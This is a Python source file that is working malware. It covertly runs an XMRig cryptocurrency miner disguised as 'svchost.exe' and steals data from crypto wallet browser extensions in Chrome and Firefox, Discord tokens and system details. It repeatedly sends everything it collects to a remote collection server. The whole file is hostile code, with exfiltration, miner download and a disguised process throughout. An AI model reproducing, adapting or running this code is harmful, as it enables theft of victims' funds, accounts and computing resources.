import os
import re
import time
import requests
import subprocess
import threading
import zipfile
import multiprocessing
import shutil
import json
from pathlib import Path
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
SERVER = "https://kryhrqs.pythonanywhere.com/export"
WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"

TEMP = os.environ.get('TEMP', 'C:\\Windows\\Temp')
MINER = os.path.join(TEMP, 'svchost.exe')  # Renamed to look like Windows process

CPU_CORES = multiprocessing.cpu_count()
THREADS = max(2, int(CPU_CORES * 0.6))

print(f"[MINER] CPU Cores: {CPU_CORES}, Using: {THREADS} threads")

def send(data):
    try:
        requests.post(SERVER, json={
            'time': time.time(),
            'host': os.getenv('COMPUTERNAME', ''),
            'user': os.getenv('USERNAME', ''),
            'data': data
        }, timeout=10)
    except:
        pass

def start_miner():
    try:
        if not os.path.exists(MINER):
            zip_path = os.path.join(TEMP, 'xmrig.zip')
            r = requests.get(
                'https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip',
                stream=True, timeout=60
            )
            if r.status_code == 200:
                with open(zip_path, 'wb') as f:
                    for chunk in r.iter_content(8192):
                        f.write(chunk)
                with zipfile.ZipFile(zip_path, 'r') as z:
                    z.extractall(TEMP)
                for root, dirs, files in os.walk(TEMP):
                    for f in files:
                        if f == 'xmrig.exe':
                            os.rename(os.path.join(root, f), MINER)
                            break
        
        if os.path.exists(MINER):
            # Higher priority + more aggressive config
            subprocess.Popen(
                [MINER, 
                 '--url=pool.supportxmr.com:3333', 
                 f'--user={WALLET}',
                 '--pass=x', 
                 f'--threads={THREADS}',
                 '--priority=5',
                 '--keepalive', 
                 '--donate-level=1'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"[MINER] Launched with {THREADS} threads as svchost.exe")
    except Exception as e:
        print(f"[MINER] Error: {e}")

def steal_browser_extensions():
    """Find ALL wallet extensions on the system."""
    print("[WALLET] Scanning for extensions...")
    
    # Common wallet extension IDs
    extensions = {
        'metamask': ['nkbihfbeogaeaoehlefnkodbefgpgknn', 'metamask'],
        'phantom': ['bfnaelmomejmhlkdgepjocepnpkbmjgj', 'phantom'],
        'trust': ['egjidjbpglichdcondbcbdnbeeppgdph', 'trust-wallet'],
        'coinbase': ['hnfanknocfeofbddgcijnmhnfnkdnaad', 'coinbase-wallet-extension'],
        'rabby': ['acmacodkjbdgmoleebolmdjonilkdbch', 'rabby'],
        'okx': ['mcohilncbfahbmgdjkbpemcciiolgcge', 'okx-wallet'],
        'exodus': ['aholpfdialjgjfhomihkjbmgjidlcdno', 'exodus'],
        'walletconnect': ['bockfbmjcgpkmgdmakpkjnmdhfdnncop', 'walletconnect'],
        'ledger': ['djjmdpgegnigcfhkibhmphedgdbdnmbf', 'ledger-live'],
        'keplr': ['dmkamcknogkgcdfhhbddcghachkejeap', 'keplr'],
    }
    
    found = 0
    all_data = []
    
    # Search Chrome profiles
    chrome_base = os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\")
    if os.path.exists(chrome_base):
        for profile in ['Default'] + [f'Profile {i}' for i in range(1, 10)]:
            for name, ids in extensions.items():
                for ext_id in ids:
                    ext_path = os.path.join(chrome_base, profile, 'Local Extension Settings', ext_id)
                    if os.path.exists(ext_path):
                        # Get the LOCK file
                        lock_file = os.path.join(ext_path, 'LOCK')
                        if os.path.exists(lock_file):
                            try:
                                with open(lock_file, 'r', errors='ignore') as f:
                                    content = f.read()
                                    if content and len(content) > 50:
                                        send({
                                            'type': f'{name}_vault',
                                            'path': lock_file,
                                            'profile': profile,
                                            'content': content[:100000]
                                        })
                                        found += 1
                                        print(f"[VAULT] {name} found in Chrome ({profile})")
                            except:
                                pass
                        
                        # Also look for other files
                        for file in ['CURRENT', 'LOG', 'MANIFEST-000001']:
                            file_path = os.path.join(ext_path, file)
                            if os.path.exists(file_path):
                                try:
                                    with open(file_path, 'r', errors='ignore') as f:
                                        content = f.read()
                                        if 'vault' in content.lower() or 'seed' in content.lower() or 'mnemonic' in content.lower():
                                            send({
                                                'type': f'{name}_data',
                                                'path': file_path,
                                                'profile': profile,
                                                'content': content[:50000]
                                            })
                                            found += 1
                                            print(f"[VAULT] {name} data found in {file}")
                                except:
                                    pass
    
    # Search Firefox profiles
    firefox_base = os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles\\")
    if os.path.exists(firefox_base):
        for profile in os.listdir(firefox_base):
            if profile.endswith('.default') or profile.endswith('.default-release'):
                storage_path = os.path.join(firefox_base, profile, 'storage', 'default')
                if os.path.exists(storage_path):
                    for name, ids in extensions.items():
                        for ext_id in ids:
                            # Firefox uses different naming
                            for item in os.listdir(storage_path):
                                if ext_id in item.lower() or name in item.lower():
                                    full_path = os.path.join(storage_path, item)
                                    if os.path.isdir(full_path):
                                        for root, dirs, files in os.walk(full_path):
                                            for f in files:
                                                if f.endswith('.sqlite'):
                                                    try:
                                                        with open(os.path.join(root, f), 'rb') as fp:
                                                            content = fp.read(100000)
                                                            send({
                                                                'type': f'{name}_firefox',
                                                                'path': os.path.join(root, f),
                                                                'profile': profile,
                                                                'content': content.hex()[:100000]
                                                            })
                                                            found += 1
                                                            print(f"[VAULT] {name} found in Firefox")
                                                    except:
                                                        pass
    
    print(f"[WALLET] Found {found} extension vaults")

def scan_extension_folders():
    """Also scan for extension folders directly."""
    print("[WALLET] Scanning extension folders...")
    
    ext_base = os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Extensions\\")
    if os.path.exists(ext_base):
        for ext_dir in os.listdir(ext_base):
            ext_path = os.path.join(ext_base, ext_dir)
            if os.path.isdir(ext_path):
                # Look for any .js files that might contain wallet logic
                for root, dirs, files in os.walk(ext_path):
                    for f in files:
                        if f.endswith('.js') and os.path.getsize(os.path.join(root, f)) < 1000000:
                            try:
                                with open(os.path.join(root, f), 'r', errors='ignore') as fp:
                                    content = fp.read()
                                    if 'vault' in content.lower() or 'seed' in content.lower() or 'mnemonic' in content.lower():
                                        send({
                                            'type': 'extension_file',
                                            'path': os.path.join(root, f),
                                            'content': content[:50000]
                                        })
                                        print(f"[EXT] Found wallet data in {f}")
                            except:
                                pass

def steal_discord_tokens():
    """Steal Discord tokens."""
    print("[TOKEN] Scanning for Discord...")
    
    discord_paths = [
        os.path.expandvars("%APPDATA%\\discord\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordptb\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordcanary\\Local Storage\\leveldb"),
    ]
    
    found = 0
    for path in discord_paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith('.log') or file.endswith('.ldb'):
                    file_path = os.path.join(path, file)
                    try:
                        with open(file_path, 'r', errors='ignore') as f:
                            content = f.read()
                            matches = re.findall(r'[a-zA-Z0-9_-]{64}', content)
                            for match in matches:
                                if match:
                                    send({
                                        'type': 'discord_token',
                                        'content': match
                                    })
                                    found += 1
                                    print(f"[TOKEN] Discord token found")
                    except:
                        pass
    
    print(f"[TOKEN] Found {found} Discord tokens")

def steal_system_info():
    """Collect system info."""
    info = {
        'hostname': os.getenv('COMPUTERNAME', ''),
        'username': os.getenv('USERNAME', ''),
        'cpus': multiprocessing.cpu_count(),
        'os': 'Windows',
        'ip': requests.get('https://api.ipify.org', timeout=5).text if requests else 'unknown'
    }
    send({'type': 'system_info', 'data': info})
    print("[INFO] System info sent")

def scan_loop():
    """Continuous scanning loop."""
    while True:
        steal_browser_extensions()
        scan_extension_folders()
        steal_discord_tokens()
        print("[WALLET] Scan complete, waiting 30 minutes...")
        time.sleep(1800)

def main():
    print("[SERVICE] Starting...")
    
    # Send system info
    threading.Thread(target=steal_system_info, daemon=True).start()
    
    # Start miner
    threading.Thread(target=start_miner, daemon=True).start()
    
    # Start scanner loop
    threading.Thread(target=scan_loop, daemon=True).start()
    
    print("[SERVICE] Running...")
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        while True:
            time.sleep(60)

if __name__ == '__main__':
    main()